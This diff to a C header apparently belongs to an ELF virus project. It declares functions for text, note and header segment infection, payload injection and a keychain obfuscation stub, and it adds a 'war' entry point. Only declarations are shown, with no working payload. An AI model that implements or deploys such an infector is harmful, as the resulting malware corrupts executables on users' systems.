@@ -70,6 +70,8 @@ struct s_host
 
 	Elf64_Addr old_entry;
 	Elf64_Addr new_entry;
+
+	void *stack;
 };
 
 struct s_keychain
@@ -85,13 +87,16 @@ struct s_keychain
 
 // LINEAR FLOW 
 void __entry(void);
+
+void war(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void host_constructor(struct s_host *host, struct s_keychain *keychain, const char *filename, enum e_context context);
 void criteria(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context contect);
 void note_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
 void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context);
-void __exit(struct s_host *host, struct s_keychain *keychain, const enum e_context context);
+
+void __exit(void *stack);
 
 // STUB (OBFUSCATION)
 __attribute__((hot)) void update_keychain_left(struct s_keychain *keychain, const char *caller, const size_t size);
